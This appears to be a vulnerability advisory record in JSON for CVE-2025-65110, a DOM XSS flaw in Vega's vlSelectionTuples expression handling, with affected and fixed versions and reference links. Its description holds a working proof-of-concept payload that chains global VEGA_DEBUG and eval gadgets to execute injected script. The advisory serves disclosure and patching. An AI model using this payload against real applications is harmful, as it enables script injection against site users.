{
  "Identifier": "CVE-2025-65110",
  "PackageSlug": "npm/vega-selections",
  "Title": "Vega XSS via expression abusing vlSelectionTuples function array map calls in environments with satisfactory function gadgets in the global scope",
  "Description": "Vega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that sets a `map` value with a function copied from the window that results in calling `this.foo(this.bar)` can be passed to the vlSelectionTuples function, calling the copied `map` function, allowing DOM XSS to be achieved.\n\nIn practice, an accessible gadget like this exists in the global VEGA_DEBUG code.\n\n```js\nvlSelectionTuples({\nmap: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on,\neventName: event.view.console.log,\n_handlers:{\nundefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'\n},\n_handlerIndex: event.view.eval\n})\n```",
  "Date": "2026-01-06",
  "Pubdate": "2026-01-05",
  "AffectedRange": "\u003c5.6.3||\u003e=6.0.0 \u003c6.1.2",
  "FixedVersions": [
    "5.6.3",
    "6.1.2"
  ],
  "AffectedVersions": "All versions before 5.6.3, all versions starting from 6.0.0 before 6.1.2",
  "NotImpacted": "All versions starting from 5.6.3 before 6.0.0, all versions starting from 6.1.2",
  "Solution": "Upgrade to versions 5.6.3, 6.1.2 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2025-65110",
    "https://github.com/advisories/GHSA-829q-m3qg-ph8r",
    "https://github.com/vega/vega/security/advisories/GHSA-829q-m3qg-ph8r",
    "https://github.com/vega/vega"
  ],
  "CvssV2": "",
  "CvssV3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
  "UUID": "473f336f-c740-4d72-9d98-edc1726eb5d5"
}